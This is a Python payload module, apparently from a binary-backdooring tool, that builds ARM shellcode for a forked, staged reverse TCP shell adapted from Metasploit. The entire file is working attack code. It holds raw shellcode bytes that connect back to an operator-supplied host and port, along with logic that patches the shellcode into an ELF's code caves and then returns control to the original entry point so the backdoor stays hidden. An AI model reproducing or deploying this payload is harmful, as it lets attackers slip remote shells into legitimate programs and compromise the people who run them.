import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class fork_reverse_shell_tcp_staged():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "fork_reverse_shell_tcp_staged"
        self.description = """Staged payload reverse tcp payload from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self): #flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified from metasploit payload/linux/x64/shell/reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """

        self.shellcode = b"\x00\x40\xa0\xe1"   # mov r4, r0 
        self.shellcode += b"\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode += b"\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode += b"\x00\x00\x00\xef"   # scv 0
        self.shellcode += b"\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode += b"\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode += b"\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode += b"\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode += b"\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.PM.BDF.elf_object['e_entry'] -(self.BDF.shellcode_vaddr +len(self.shellcode)) - 4)/4
        self.shellcode += struct.pack("<I", int(jmpAddr)).strip(b"\x00")
        self.shellcode += b"\xea"   #b entrypoint

        #SHELLCODE
        self.shellcode += bytes("\xb4\x70\x9f\xe5\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0"
                            "\xe3\x00\x00\x00\xef\x00\xc0\xa0\xe1\x02\x70\x87\xe2\x90\x10"
                            "\x8f\xe2\x10\x20\xa0\xe3\x00\x00\x00\xef\x0c\x00\xa0\xe1\x04"
                            "\xd0\x4d\xe2\x08\x70\x87\xe2\x0d\x10\xa0\xe1\x04\x20\xa0\xe3"
                            "\x00\x30\xa0\xe3\x00\x00\x00\xef\x00\x10\x9d\xe5\x70\x30\x9f"
                            "\xe5\x03\x10\x01\xe0\x01\x20\xa0\xe3\x02\x26\xa0\xe1\x02\x10"
                            "\x81\xe0\xc0\x70\xa0\xe3\x00\x00\xe0\xe3\x07\x20\xa0\xe3\x54"
                            "\x30\x9f\xe5\x00\x40\xa0\xe1\x00\x50\xa0\xe3\x00\x00\x00\xef"
                            "\x63\x70\x87\xe2\x00\x10\xa0\xe1\x0c\x00\xa0\xe1\x00\x30\xa0"
                            "\xe3\x00\x20\x9d\xe5\xfa\x2f\x42\xe2\x00\x20\x8d\xe5\x00\x00"
                            "\x52\xe3\x02\x00\x00\xda\xfa\x2f\xa0\xe3\x00\x00\x00\xef\xf7"
                            "\xff\xff\xea\xfa\x2f\x82\xe2\x00\x00\x00\xef\x01\xf0\xa0\xe1"
                            "\x02\x00", 'iso-8859-1')
        self.shellcode += struct.pack('!H', int(self.PORT))
        self.shellcode += common.pack_ip_addresses(self.HOST)
        self.shellcode += b"\x19\x01\x00\x00\x00\xf0\xff\xff\x22\x10\x00\x00"

        return self.shellcode
